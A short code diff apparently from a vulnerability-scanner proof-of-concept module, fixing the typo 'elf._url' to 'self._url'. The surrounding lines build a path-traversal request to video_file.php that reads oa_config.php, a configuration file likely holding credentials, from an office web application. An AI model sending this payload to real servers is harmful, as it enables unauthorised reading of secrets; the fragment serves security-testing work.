@@ -23,7 +23,7 @@ class POC(base_poc):
             + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
         )
         return (
-            elf._url
+            self._url
             + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
         )
 
